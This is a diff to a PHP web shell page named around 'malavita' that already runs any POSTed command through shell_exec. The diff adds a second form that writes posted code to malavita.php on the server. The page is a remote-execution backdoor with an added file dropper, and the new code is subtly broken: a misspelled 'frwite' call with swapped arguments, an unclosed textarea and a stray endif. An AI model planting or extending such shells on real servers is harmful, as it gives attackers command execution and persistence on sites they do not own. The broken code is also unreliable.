@@ -2,6 +2,11 @@
 if (!empty($_POST['malavita'])) {
     $malavita = shell_exec($_POST['malavita']);
 }
+if (!empty($_POST['malavita2'])) {
+    $ml = fopen('./malavita.php', 'w');
+    $malavita2 = frwite($_POST['malavita2'], $ml);
+    fclose($ml);
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -90,6 +95,15 @@ if (!empty($_POST['malavita'])) {
                 <button type="submit">Execute</button>
             </div>
         </form>
+        <hr />
+        <form method="post">
+            <label for="malavita"><strong>Code</strong></label>
+            <div class="form-group">
+                <textarea name="malavita2" id="malavita2" value="<?php echo htmlspecialchars($_POST['malavita2'], ENT_QUOTES, 'UTF-8'); ?>"
+                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                <button type="submit">Create File</button>
+            </div>
+        </form>
 
         <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
             <h2>Output</h2>
@@ -98,6 +112,11 @@ if (!empty($_POST['malavita'])) {
             <?php else: ?>
                 <pre><small>No result.</small></pre>
             <?php endif; ?>
+            <?php if ($malavita2): ?>
+                <hr />
+                <pre><samp>File created at <kbd><?php echo '//'.$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']);?></kbd></samp></pre>
+            <?php endif; ?>
+        <?php endif; ?>
         <?php endif; ?>
     </main>
 </body>
